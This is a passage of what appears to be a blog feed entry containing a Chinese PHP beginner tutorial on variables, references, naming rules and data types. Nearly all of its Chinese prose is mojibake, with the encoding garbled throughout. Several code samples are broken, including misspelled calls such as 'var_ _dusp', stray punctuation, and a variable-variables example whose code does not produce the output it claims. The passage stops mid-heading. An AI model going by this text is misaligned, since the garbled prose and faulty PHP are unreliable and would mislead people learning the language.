      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPçš„åŸºæœ¬æ¦‚å¿µå’Œå˜é‡</title>
    <link href="/2020/05/20/PHP%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E9%87%8F/"/>
    <url>/2020/05/20/PHP%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPå­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</p> <a id="more"></a><h2 id="PHP-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP æ˜¯ä»€ä¹ˆï¼Ÿ"></a>PHP æ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote><p> PHPï¼ˆå…¨ç§°ï¼šPHPï¼šHypertext Preprocessorï¼Œå³â€PHPï¼šè¶…æ–‡æœ¬é¢„å¤„ç†å™¨â€ï¼‰æ˜¯ä¸€ç§é€šç”¨å¼€æºè„šæœ¬è¯­è¨€ã€‚</p><p> PHP è„šæœ¬åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚</p><p> PHP å¯å…è´¹ä¸‹è½½ä½¿ç”¨ã€‚</p></blockquote><p>PHPæ˜¯åˆ›å»ºåŠ¨æ€ç½‘é¡µçš„æœ€æµè¡Œçš„æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼Œå¹¶ä¸”æ˜¯å¼€æºå…è´¹çš„ã€‚</p><blockquote><p>PHPä»£è¡¨è¶…æ–‡æœ¬é¢„å¤„ç†å™¨ã€‚PHPæ˜¯ä¸€ç§éå¸¸æµè¡Œä¸”å¹¿æ³›ä½¿ç”¨çš„å¼€æºæœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼Œç”¨äºç¼–å†™åŠ¨æ€ç”Ÿæˆçš„Webé¡µé¢ã€‚PHPæœ€åˆç”± Rasmus Lerdorf äº1994å¹´åˆ›å»ºã€‚å®ƒæœ€åˆè¢«ç§°ä¸ºä¸ªäººä¸»é¡µã€‚<br>PHPè„šæœ¬åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼å‘é€åˆ°Webæµè§ˆå™¨ã€‚PHPå¯ä»¥ä¸ä¼—å¤šæµè¡Œæ•°æ®åº“é›†æˆï¼ŒåŒ…æ‹¬MySQLï¼ŒPostgreSQLï¼ŒOracleï¼ŒMicrosoft SQL Serverï¼ŒSybaseç­‰ã€‚</p></blockquote><p><strong>è¿è¡Œ</strong></p><p>ä¸‹é¢æˆ‘ä»¬æ¥è¿è¡Œç¬¬ä¸€ä¸ªç¨‹åºï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World!&quot;</span>; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello World!<br></code></pre></td></tr></table></figure><h2 id="PHPå˜é‡"><a href="#PHPå˜é‡" class="headerlink" title="PHPå˜é‡"></a>PHPå˜é‡</h2><p>PHPå˜é‡æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>1ã€åœ¨PHPä¸­å˜é‡æ˜¯ç”¨äºå‚¨å­˜ä¿¡æ¯çš„å®¹å™¨ï¼Œç±»ä¼¼äºæ•°å­¦ä¸­çš„é›†åˆã€‚<br>2ã€èµ‹å€¼æ–¹æ³•ä¸æ•°å­¦ä¸­çš„ä»£æ•°ç›¸ç±»ä¼¼ã€‚<br>3ã€å˜é‡æ˜¯ç”¨äºå­˜å‚¨ä¿¡æ¯çš„â€å®¹å™¨â€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$x</span>=<span class="hljs-number">5</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-number">6</span>;<br><span class="hljs-variable">$z</span>=<span class="hljs-variable">$x</span>+<span class="hljs-variable">$y</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$z</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p>PHP å˜é‡ä¸ä»£æ•°ç±»ä¼¼ï¼Œå¯ä»¥ç»™ PHP å˜é‡èµ‹äºˆæŸä¸ªå€¼ï¼ˆx=5ï¼‰æˆ–è€…è¡¨è¾¾å¼ï¼ˆz=x+yï¼‰ã€‚</p><p>å˜é‡å¯ä»¥æ˜¯å¾ˆçŸ­çš„åç§°ï¼ˆå¦‚ x å’Œ yï¼‰æˆ–è€…æ›´å…·æè¿°æ€§çš„åç§°ï¼ˆå¦‚ nameã€ageã€idï¼‰ã€‚</p><h2 id="PHPå˜é‡çš„åˆ›å»ºï¼ˆå£°æ˜ï¼‰"><a href="#PHPå˜é‡çš„åˆ›å»ºï¼ˆå£°æ˜ï¼‰" class="headerlink" title="PHPå˜é‡çš„åˆ›å»ºï¼ˆå£°æ˜ï¼‰"></a>PHPå˜é‡çš„åˆ›å»ºï¼ˆå£°æ˜ï¼‰</h2><blockquote><p>$å˜é‡å=æ•°æ®(å€¼)<br>=åœ¨æ•°å­¦é‡Œé¢æ˜¯ç­‰äºçš„æ„æ€,åœ¨æˆ‘ä»¬çš„ç¨‹åºè¯­è¨€é‡Œé¢ï¼Œå®ƒä¸æ˜¯ç­‰äºå·ï¼Œå®ƒæ˜¯â€™èµ‹å€¼æ“ä½œç¬¦â€™</p></blockquote><p>PHP æ²¡æœ‰å£°æ˜å˜é‡çš„å‘½ä»¤ã€‚</p><p>å˜é‡åœ¨ç¬¬ä¸€æ¬¡èµ‹å€¼ç»™å®ƒçš„æ—¶å€™è¢«åˆ›å»ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Hello world!&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-number">5</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-number">10.5</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„è¯­å¥æ‰§è¡Œä¸­ï¼Œ<br>å˜é‡ aå°†ä¿å­˜å€¼ Hello world!ï¼Œä¸”å˜é‡bå°†ä¿å­˜å€¼ 5,åŒç†å˜é‡cä¿å­˜å€¼10.5ã€‚</p><p><strong>æ³¨æ„ï¼šå½“æ‚¨èµ‹ä¸€ä¸ª<font color=#FF0000 size=3>æ–‡æœ¬å€¼</font>ç»™å˜é‡æ—¶ï¼Œè¯·åœ¨æ–‡æœ¬å€¼ä¸¤ä¾§åŠ ä¸Šå¼•å·ã€‚</strong></p><h2 id="PHPå˜é‡çš„é”€æ¯"><a href="#PHPå˜é‡çš„é”€æ¯" class="headerlink" title="PHPå˜é‡çš„é”€æ¯"></a>PHPå˜é‡çš„é”€æ¯</h2><blockquote><p>è¿ç”¨unset()å‡½æ•°æ¶ˆé™¤å˜é‡<br>æ ¼å¼ï¼š unset($å˜é‡åç§°)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>; .<br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$a</span>) :<span class="hljs-comment">//é”€æ¯aå˜é‡</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-comment">//æç¤ºå‡ºé”™ï¼Œå› ä¸ºå˜é‡aå·²ç»è¢«é”€æ¯äº†</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-å˜é‡çš„å‘½åè§„åˆ™"><a href="#PHP-å˜é‡çš„å‘½åè§„åˆ™" class="headerlink" title="PHP å˜é‡çš„å‘½åè§„åˆ™"></a>PHP å˜é‡çš„å‘½åè§„åˆ™</h2><blockquote><p>PHP å˜é‡è§„åˆ™ï¼š</p><p>å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§°</p><p>å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹</p><p>å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰</p><p>å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼</p><p>å˜é‡åæ˜¯ä¸¥æ ¼åŒºåˆ†å¤§å°å†™çš„ï¼ˆ$nameå’Œ$NAMEæ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼‰</p></blockquote><p>æ³¨ï¼šPHPä¸­æœ‰ä¸€äº›æ ‡ç¤ºç¬¦æ˜¯ç³»ç»Ÿå®šä¹‰çš„ï¼Œä¹Ÿç§°ä¸ºå…³é”®å­—ï¼Œæ˜¯PHPè¯­è¨€çš„ç»„æˆéƒ¨åˆ†ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨å®ƒä»¬ä¸­çš„ä»»ä½•ä¸€ä¸ªä½œä¸ºå¸¸é‡å‡½æ•°åæˆ–ç±»åã€‚ä½†æ˜¯å’Œå…¶ä»–è¯­è¨€ä¸åŒçš„æ˜¯å¯ä»¥åœ¨PHPä¸­ä½œä¸ºå˜é‡åç§°ä½¿ç”¨ä¸è¿‡è¿™æ ·å®¹æ˜“æ··æ·†ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯ä¸è¦ç”¨PPçš„å…³é”®å­—ä½œä¸ºå˜é‡åç§°ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200520193400288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="PHPå¯å˜å˜é‡"><a href="#PHPå¯å˜å˜é‡" class="headerlink" title="PHPå¯å˜å˜é‡"></a>PHPå¯å˜å˜é‡</h2><p>ä¸€ä¸ªå˜é‡çš„åå­—å¯ä»¥åŠ¨æ€çš„è®¾ç½®å’Œä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$abc</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªå˜é‡abcé‡Œé¢å­˜äº†å€¼test</span><br><span class="hljs-variable">$abc</span>=<span class="hljs-string">&#x27;aaa&#x27;</span> ;<span class="hljs-comment">//$test=&#x27;aaa&#x27;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">aaa<br></code></pre></td></tr></table></figure><h2 id="PHPå˜é‡çš„å¼•ç”¨èµ‹å€¼"><a href="#PHPå˜é‡çš„å¼•ç”¨èµ‹å€¼" class="headerlink" title="PHPå˜é‡çš„å¼•ç”¨èµ‹å€¼"></a>PHPå˜é‡çš„å¼•ç”¨èµ‹å€¼</h2><p>å¼•ç”¨èµ‹å€¼å¯ä»¥ç®€å•çš„ç†è§£ä¸ºç»™å˜é‡èµ·äº†ä¸ªåˆ«å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1000</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>;<span class="hljs-comment">//ç›¸å½“äºæŠŠ$açš„å€¼ï¼Œå¤åˆ¶ä¸€ä»½å†èµ‹å€¼ç»™$bè¿™ä¸ªå˜é‡</span><br><span class="hljs-variable">$b</span>=&amp;<span class="hljs-variable">$a</span>;<span class="hljs-comment">//ç›¸å½“äºç»™$aèµ·äº†ä¸€ä¸ªåˆ«åï¼Œæ“ä½œå…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œéƒ½ä¼šå½±å“åˆ°å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼!</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h2 id="PHPå˜é‡ç±»å‹"><a href="#PHPå˜é‡ç±»å‹" class="headerlink" title="PHPå˜é‡ç±»å‹"></a>PHPå˜é‡ç±»å‹</h2><blockquote><p>ä½¿ç”¨var_ dump(å˜é‡å)å¯ä»¥è¾“å‡ºå˜é‡çš„ç±»å‹</p></blockquote><p>1.å˜é‡ç±»å‹ç®€ä»‹</p><blockquote><p>åœ¨PHPç¨‹åºä¸­ï¼Œæ•°æ®ç±»å‹å¯ä»¥åˆ†æˆ3ç§ï¼šæ ‡é‡æ•°æ®ç±»å‹ã€å¤åˆæ•°æ®ç±»å‹ï¼ˆå³å°†å¤šä¸ªç®€å•æ•°æ®ç±»å‹ç»„åˆåœ¨ä¸€èµ·ï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªå˜é‡åä¸­ï¼‰å’Œç‰¹æ®Šæ•°æ®ç±»å‹ã€‚<br>1ï¼æ ‡é‡æ•°æ®ç±»å‹æ ‡é‡æ•°æ®ç±»å‹åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ã€‚<br>ï¼ˆ1ï¼‰booleanï¼šå¸ƒå°”å‹<br>å¸ƒå°”å˜é‡æ˜¯PHPå˜é‡ä¸­æœ€ç®€å•çš„ã€‚å®ƒä¿å­˜ä¸€ä¸ªTrueæˆ–è€…Falseå€¼ã€‚å…¶ä¸­Trueæˆ–è€…Falseæ˜¯PHPçš„å†…éƒ¨å…³é”®å­—ã€‚è®¾å®šä¸€ä¸ªå¸ƒå°”å‹çš„å˜é‡ï¼Œåªéœ€å°†Trueæˆ–è€…Falseèµ‹å€¼ç»™è¯¥å˜é‡<br>ï¼ˆ2ï¼‰stringï¼šå­—ç¬¦ä¸²<br>å­—ç¬¦ä¸²æ˜¯è¿ç»­çš„å­—ç¬¦åºåˆ—ï¼Œå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦åªå ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚åœ¨PHPä¸­ï¼Œå®šä¹‰å­—ç¬¦ä¸²æœ‰3ç§æ–¹å¼ï¼šå•å¼•å·æ–¹å¼ï¼ŒåŒå¼•å·æ–¹å¼ï¼Œå®šç•Œç¬¦æ–¹å¼ã€‚<br>ï¼ˆ3ï¼‰integerï¼šæ•´æ•°<br>æ•´æ•°æ•°æ®ç±»å‹åªèƒ½åŒ…å«æ•´æ•°ã€‚è¿™äº›æ•°æ®ç±»å‹å¯ä»¥æ˜¯æ­£æ•°æˆ–è´Ÿæ•°ã€‚åœ¨32ä½çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰æ•ˆçš„èŒƒå›´æ˜¯2 147 483 648ï½+2147 483<br>647ã€‚<br>ï¼ˆ4ï¼‰doubleï¼šæµ®ç‚¹æ•°<br>æµ®ç‚¹æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥å­˜å‚¨æ•°å­—ï¼Œä¹Ÿå¯ä»¥ä¿å­˜å°æ•°ã€‚å®ƒæä¾›çš„ç²¾åº¦ä¸æ•´æ•°å¤§å¾—å¤šã€‚åœ¨32ä½çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰æ•ˆçš„èŒƒå›´æ˜¯1.7E-308ï½1.7E+308ã€‚</p><p>2ï¼å¤åˆæ•°æ®ç±»å‹å¤åˆæ•°æ®ç±»å‹åŒ…æ‹¬ä»¥ä¸‹ä¸¤ç§ã€‚<br>ï¼ˆ1ï¼‰arrayï¼šæ•°ç»„å¯ä»¥æ˜¯äºŒç»´ã€ä¸‰ç»´æˆ–è€…å¤šç»´ï¼Œæ•°ç»„ä¸­çš„å„å…ƒç´ å¯ä»¥æ˜¯stringã€integeræˆ–doubleï¼Œä¹Ÿå¯ä»¥æ˜¯arrayã€‚<br>ï¼ˆ2ï¼‰objectï¼šå¯¹è±¡ç±»å‹</p><p>3ï¼ç‰¹æ®Šæ•°æ®ç±»å‹ç‰¹æ®Šæ•°æ®ç±»å‹åŒ…æ‹¬ä»¥ä¸‹ä¸¤ç§ã€‚<br>ï¼ˆ1ï¼‰resourceï¼šèµ„æº èµ„æºæ˜¯PHPå†…çš„å‡ ä¸ªå‡½æ•°æ‰€éœ€è¦çš„ç‰¹æ®Šæ•°æ®ç±»å‹ï¼Œç”±ç¼–ç¨‹äººå‘˜æ¥åˆ†é…ã€‚<br>ï¼ˆ2ï¼‰nullï¼šç©ºå€¼ ç©ºå€¼æ˜¯æœ€ç®€å•çš„æ•°æ®ç±»å‹ã€‚è¡¨ç¤ºæ²¡æœ‰ä¸ºè¯¥å˜é‡è®¾ç½®ä»»ä½•å€¼ï¼Œå¦å¤–ï¼Œç©ºå€¼ï¼ˆNULLï¼‰ä¸åŒºåˆ†å¤§å°å†™ã€‚</p></blockquote><ol><li>bool(å¸ƒå°”å‹)</li></ol><p>  è¿™ä¸ªæ˜¯æœ€ç®€å•çš„ç±»å‹å¸ƒå°”å‹è¡¨è¾¾äº†trueæˆ–false,å³çœŸæˆ–å‡ã€‚ ä»¥ä¸‹å€¼è¢«è®¤ä¸ºæ˜¯false.å…¶ä»–çš„å€¼éƒ½æ˜¯è¢«è®¤ä¸ºæ˜¯true<br>   â‘ å¸ƒå°”å€¼false<br> â‘¡0<br>  â‘¢æµ®ç‚¹å‹0.0<br>â‘£ç©ºç™½å­—ç¬¦äº‹å’Œå­—ç¬¦ä¸²<br>   â‘¤æ²¡æœ‰æˆå‘˜çš„æ•°ç»„<br>   â‘¥NULL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>= <span class="hljs-literal">true</span>,<br>var_ dump(<span class="hljs-variable">$a</span>) ;<span class="hljs-comment">//å¾€å˜é‡é‡Œé¢å­˜trueæˆ–è€…talse,é‚£ä¹ˆè¿™ä¸ªå˜é‡å°±æ˜¯å¸ƒå°”å‹äº†</span><br></code></pre></td></tr></table></figure><ol start="2"><li>int (æ•´å‹)<br>å¾€å˜é‡é‡Œé¢å­˜å‚¨æ•´æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡å°±æ˜¯æ•´å‹å˜é‡äº†</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br>var_ _dusp(<span class="hljs-variable">$a</span>)<br></code></pre></td></tr></table></figure><ol start="3"><li>float (æµ®ç‚¹å‹ï¼Œä¹Ÿç§°double)<br>å¾€å˜é‡é‡Œé¢å­˜å°æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡å°±æ˜¯æµ®ç‚¹å‹å˜é‡äº†</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-number">1.1</span>;<br>var_ _dusp(<span class="hljs-variable">$a</span>)<br></code></pre></td></tr></table></figure><ol start="4"><li>string (å­—ç¬¦ä¸²)<br>å­—ç¬¦ä¸²å°±æ˜¯ä¸€ç³»åˆ—çš„å­—ç¬¦ç»„æˆä¸²åœ¨ä¸€èµ·ï¼Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨å•å¼•å·ã€åŒå¼•å·ã€å®šç•Œç¬¦ä¸‰ç§æ–¹æ³•æ¥å®šä¹‰!</li></ol><p>â‘ å•å¼•å·</p><blockquote><p>æŒ‡å®šä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ä¸€å¯¹å•å¼•å·æ‹¬èµ·æ¥æ³¨æ„åœ¨å•å¼•å·â€™æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²ä¸­ä¸èƒ½å†åŒ…å«å•å¼•å·ï¼Œå¦‚æœå®åœ¨è¦ç”¨å•å¼•å·é‚£ä¹ˆå°±éœ€è¦ç”¨åæ–œæ ()è½¬ä¹‰ï¼Œé—®é¢˜ï¼Œå¦‚æœå®‡ç¬¦ä¸²ä¸­ç¡®å®éœ€è¦ä¸€ä¸ªçœŸæ­£çš„åæ–œæ æ€ä¹ˆåŠ?<br>å•å¼•å·å­—ç¬¦ä¸²ä¸­å‡ºç°çš„å®‰é‡ä¸ä¼šè¢«å˜é‡çš„å€¼æ›¿ä»£,å³PHPä¸ä¼šè§£æå•å¼•å·ä¸­çš„å˜é‡ï¼Œå› æ­¤åœ¨å®šä¹‰ç®€å•å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä½¿ç”¨å•å¼•å·ä¼šæ•ˆç‡æ›´é«˜ï¼Œå› æ­¤æ²¡æœ‰ç‰¹åˆ«çš„è¦æ±‚ï¼Œåº”ä½¿ç”¨å•å¼•å·å®šä¹‰å­—ç¬¦ä¸²!</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test$abc\&#x27;defgh&#x27;</span>;<br>var_ dump(<span class="hljs-variable">$a</span>) ;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;test<span class="hljs-subst">$abc</span>&#x27;defgh&quot;</span><br>test<span class="hljs-variable">$abc</span><span class="hljs-string">&#x27;defgh</span><br></code></pre></td></tr></table></figure><p>åœ¨å®šä¹‰ä¸€äº›ç®€å•çš„å­—ç¬¦ä¸²çš„æ—¶å€™ä½¿ç”¨å•å¼•å·è¿™ç§æ–¹æ³•æ•ˆç‡æ¯”è¾ƒé«˜</p><p>â‘¡åŒå¼•å·<br>åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå…¶ä¸­çš„å˜é‡åä¼šè¢«å˜é‡å€¼æ‰€ä»£æ›¿ã€‚å³PHPä¼šè§£æåŒå¼•å·ä¹‹é—´çš„å˜é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">100</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27; teSbst......&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;te<span class="hljs-subst">&#123;$b&#125;</span>t......&quot;</span>;<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;te100t......&quot;</span><br>te100t......<br></code></pre></td></tr></table></figure><p> â‘¢å®šç•Œç¬¦<br> &lt;&lt;&lt;ä¹‹åæä¾›ä¸€ä¸ªæ ‡ç¤ºç¬¦å¼€å§‹ï¼Œç„¶åæ˜¯å­—ç¬¦ä¸²çš„å†…å®¹æœ€åæ˜¯åŒæ ·çš„</p><blockquote><p>æ ‡ç¤ºç¬¦è¡¨ç¤ºç»“æŸ<br>æ³¨æ„ç»“æŸæ ‡ç¤ºç¬¦ä¹‹åå¿…é¡»æ¥ï¼Œä¸å¯ä»¥ç”¨å…¶ä»–çš„ä»»ä½•å­—ç¬¦<br>æ ‡ç¤ºç¬¦çš„å‘½åè§„åˆ™ï¼šå­—æ¯æ•°å­—ä¸‹åˆ’çº¿ã€‚ å¹¶ä¸”ä¸èƒ½ä»¥æ•°å­—å¼€å§‹</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=&lt;&lt;&lt;aaa<br>abcdefghijklmnopqrstuvwxyz<br>aaa ;<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">26</span>) <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€"><a href="#PHP-æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€" class="headerlink" title="PHP æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€"></a>PHP æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€</h2><ol><li><p>ä¸å¿…å‘ PHP å£°æ˜è¯¥å˜é‡çš„æ•°æ®ç±»å‹ã€‚</p></li><li><p>PHP ä¼šæ ¹æ®å˜é‡çš„å€¼ï¼Œè‡ªåŠ¨æŠŠå˜é‡è½¬æ¢ä¸ºæ­£ç¡®çš„æ•°æ®ç±»å‹ã€‚</p></li><li><p>åœ¨å¼ºç±»å‹çš„ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä½¿ç”¨å˜é‡å‰å…ˆå£°æ˜ï¼ˆå®šä¹‰ï¼‰å˜é‡çš„ç±»å‹å’Œåç§°ã€‚</p></li></ol><h2 id="phpstudy2020-Sublime-Text-3åˆ›å»ºPHPç¼–è¯‘ç¯å¢ƒ"><a href="#phpstudy2020-Sublime-Text-3åˆ›å»ºPHPç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="phpstudy2020+Sublime Text 3åˆ›å»ºPHPç¼–è¯‘ç¯å¢ƒ"></a>phpstudy2020+Sublime Text 